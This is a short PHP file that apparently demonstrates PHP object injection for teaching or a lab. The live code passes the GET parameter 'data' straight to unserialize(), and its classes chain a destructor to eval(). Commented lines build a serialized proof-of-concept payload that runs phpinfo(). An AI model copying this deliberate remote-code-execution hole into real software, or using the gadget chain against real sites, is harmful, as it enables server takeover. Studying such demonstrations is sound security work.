<?php
class example{
	public $handle;
	function __destruct(){
		$this->shutdown();
	}
	public function shutdown(){
		$this->handle->close();
	}
}


class process{
	public $pid;
	function close(){
		eval($this->pid);
	}
}


if(isset($_GET['data'])){
	$user_data = unserialize($_GET['data']);
}


// class example{
	// public $handle;
	// function __construct(){
		// $this->handle = new process();
	// }
// }

// class process{
	// public $pid;
	// function __construct(){
		// $this->pid = "phpinfo();";
	// }
// }

// $user_data = new example();
// print(serialize($user_data));

// O:7:"example":1:{s:6:"handle";O:7:"process":1:{s:3:"pid";s:10:"phpinfo();";}}
?>
